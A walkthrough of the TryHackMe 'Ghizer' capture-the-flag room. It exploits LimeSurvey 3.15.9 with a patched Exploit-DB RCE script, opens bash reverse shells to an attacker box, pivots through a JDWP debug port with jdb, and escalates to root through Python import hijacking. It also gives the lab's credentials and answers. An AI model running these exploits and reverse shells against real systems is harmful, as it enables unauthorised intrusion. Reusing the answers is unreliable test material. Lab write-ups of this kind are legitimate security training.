# Ghizer

lucrecia has installed multiple web applications on the server.

room: https://tryhackme.com/room/ghizerctf

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/ghizerctf.md

---

## Enumeration

Initial scan:

```bash
nmap -sV -sC -p- <TARGET>
````

Interesting ports:

```text
21/tcp     FTP
80/tcp     HTTP - LimeSurvey
443/tcp    HTTPS - WordPress
18002/tcp  Java RMI / Ghidra related
```

The web apps are split between ports:

```text
http://<TARGET>/      LimeSurvey
https://<TARGET>/     WordPress
```

---

## FTP

FTP allows anonymous login, but the files look like bait/hints rather than the main path.

```bash
ftp <TARGET>
```

Files visible:

```text
client.py
test.c
prototype.c
root.txt
user.txt
i_honeypot.py
```

The `root.txt` and `user.txt` files here are not the real flags.

---

## LimeSurvey Enumeration

Gobuster against port 80:

```bash
gobuster dir \
  -u http://<TARGET>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Interesting paths:

```text
/admin
/docs
/application
/upload
/plugins
/tmp
```

The LimeSurvey version can be found in the release notes:

```bash
curl -s http://<TARGET>/docs/release_notes.txt | head
```

Version:

```text
LimeSurvey 3.15.9
```

The admin panel is available at:

```text
http://<TARGET>/admin
```

Default credentials work:

```text
admin:password
```

---

## LimeSurvey RCE

Searchsploit shows an RCE for LimeSurvey below 3.16:

```bash
searchsploit limesurvey
```

Relevant exploit:

```text
LimeSurvey < 3.16 - Remote Code Execution
Exploit-DB: 46634.py
```

Copy it locally:

```bash
searchsploit -m php/webapps/46634.py
```

The exploit is Python 2 originally, but it can be fixed to run under Python 3.

---

## Fixing Exploit 46634 for Python 3

Convert with `2to3`:

```bash
cp 46634.py 46634_py3.py
2to3 -w 46634_py3.py
```

After conversion, there is a bug caused by this line:

```python
input = input("$ ")
```

This shadows the built-in `input()` function and causes an error like:

```text
UnboundLocalError: local variable 'input' referenced before assignment
```

Patch it:

```bash
sed -i 's/input = input("\$ ")/cmd = input("\$ ")/' 46634_py3.py
sed -i 's/(url, input)/(url, cmd)/' 46634_py3.py
```

Or with Python:

```bash
python3 - <<'PY'
from pathlib import Path

p = Path("46634_py3.py")
s = p.read_text()

s = s.replace('input = input("$ ")', 'cmd = input("$ ")')
s = s.replace('"%s/shell.php?c=%s" % (url, input)', '"%s/shell.php?c=%s" % (url, cmd)')

p.write_text(s)
PY
```

Run it without a trailing slash on the URL:

```bash
python3 46634_py3.py "http://<TARGET>" admin password
```

A successful run gives a command shell as `www-data`.

```bash
whoami
```

```text
www-data
```

---

## Upgrade Shell

Set a listener:

```bash
nc -lvnp 4444
```

From the exploit shell:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKBOX_IP>/4444 0>&1'
```

Upgrade TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Finding Config Credentials

The LimeSurvey config file is located at:

```text
/var/www/html/limesurvey/application/config/config.php
```

Read it:

```bash
cat /var/www/html/limesurvey/application/config/config.php
```

Database credentials found:

```text
Anny:P4$W0RD!!#S3CUr3!
```

These creds are used later for WordPress.

---

## WordPress Hidden Login Path

WordPress is running on HTTPS:

```text
https://<TARGET>/
```

The page hints that WPS Hide Login is used.

The WordPress database credentials are in:

```text
/var/www/html/wordpress/wp-config.php
```

Read the DB config:

```bash
grep -Ei "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|table_prefix" /var/www/html/wordpress/wp-config.php
```

Output:

```text
DB_NAME: wordpress
DB_USER: wordpressuser
DB_PASSWORD: password
```

Query the WPS Hide Login option:

```bash
mysql -u wordpressuser -p'password' wordpress -e \
"SELECT option_name, option_value FROM wp_options WHERE option_name='whl_page';"
```

Result:

```text
whl_page    devtools
```

So the hidden WordPress login path is:

```text
/?devtools
```

Test it:

```bash
curl -k -s -L "https://<TARGET>/?devtools" \
| grep -Ei "user_login|wp-submit|Password|Lost your password"
```

Login creds:

```text
Anny:P4$W0RD!!#S3CUr3!
```

This confirms the WordPress step, but getting another web shell here is not needed because we already have `www-data`.

---

## Pivot to Veronica

Check local listening ports:

```bash
ss -lntp 2>/dev/null
```

Interesting local-only port:

```text
127.0.0.1:18001
```

This is a JDWP debug port.

Attach with `jdb` from the target:

```bash
jdb -attach 127.0.0.1:18001
```

Inside `jdb`, set a breakpoint:

```text
stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
run
```

Wait until the breakpoint hits:

```text
Breakpoint hit:
Log4j2-TF-4-Scheduled-1[1]
```

Prepare a reverse shell script from the `www-data` shell:

```bash
cat > /tmp/rs.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKBOX_IP>/5555 0>&1
EOF

chmod +x /tmp/rs.sh
```

Start a listener:

```bash
nc -lvnp 5555
```

Back in `jdb`, execute the script:

```text
print java.lang.Runtime.getRuntime().exec("/bin/bash /tmp/rs.sh")
```

Catch a shell as `veronica`:

```bash
whoami
```

```text
veronica
```

Read the user flag:

```bash
cat /home/veronica/user.txt
```

```text
THM{EB0C...EBD3}
```

---

## Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Output:

```text
User veronica may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
```

The intended path is the `base.py` sudo entry.

View the file:

```bash
cat /home/veronica/base.py
```

```python
import base64

hijackme = base64.b64encode(b'tryhackme is the best')
print(hijackme)
```

Because it imports `base64`, we can hijack the import by creating a local `base64.py`.

Create malicious `base64.py`:

```bash
cd /home/veronica

cat > base64.py <<'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash")
os.system("chmod 4755 /tmp/rootbash")

def b64encode(x):
    return x
EOF
```

Run the allowed sudo command:

```bash
sudo /usr/bin/python3.5 /home/veronica/base.py
```

Pop root:

```bash
/tmp/rootbash -p
```

Confirm:

```bash
id
```

```text
uid=1000(veronica) gid=1000(veronica) euid=0(root)
```

Read root flag:

```bash
cat /root/root.txt
```

```text
THM{02EA...A1D9}
```

---

## Answers

```text
What are the credentials you found in the configuration file?
Anny:P4$W0RD!!#S3CUr3!
```

```text
What is the login path for the wordpress installation?
/?devtools
```

```text
Compromise the machine and locate user.txt
THM{EB0C...EBD3}
```

```text
Escalate privileges and obtain root.txt
THM{02EA...A1D9}
```

---

## Notes

The main rabbit holes were:

* FTP files that looked important but were not required
* WordPress shelling, which was unnecessary after LimeSurvey RCE
* Ghidra config files under `/home/veronica/ghidra_9.0`, which looked writable but were not the real privilege path

The important pivot was:

```text
127.0.0.1:18001 JDWP → jdb exec → veronica shell
```

